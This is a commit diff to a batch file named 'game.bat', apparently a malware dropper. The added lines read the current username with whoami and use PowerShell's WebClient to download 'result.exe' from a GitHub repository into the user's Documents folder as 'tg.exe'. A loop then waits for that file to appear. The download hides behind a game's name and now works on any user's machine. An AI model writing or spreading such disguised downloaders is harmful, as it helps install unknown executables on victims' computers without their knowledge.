e2d18cd24b571ebb645a543ec19b7b3d278f72c7
neginsadeghi2005 <nedaa.sadeghi.1997@gmail.com>
2025-03-07 21:06:52 +0330

    Update game.bat

--- game.bat
+++ game.bat
@@ -1,7 +1,8 @@
-PowerShell -Command "$webClient = New-Object System.Net.WebClient; $webClient.DownloadFile('https://github.com/neginsadeghi2005/project/raw/refs/heads/main/result.exe' , 'C:\Users\hhaam687\Documents\tg.exe')"
+for /f "tokens=2 delims=\" %%i in ('whoami') do set "user=%%i"
+PowerShell -Command "$webClient = New-Object System.Net.WebClient; $webClient.DownloadFile('https://github.com/neginsadeghi2005/project/raw/refs/heads/main/result.exe' , 'C:\Users\%user%\Documents\tg.exe')"
 
 :check
-	if "C:\Users\hhaam687\Documents\tg.exe" exist (
+	if "C:\Users\%user%\Documents\tg.exe" exist (
 	
 	) else ( 
 		goto check
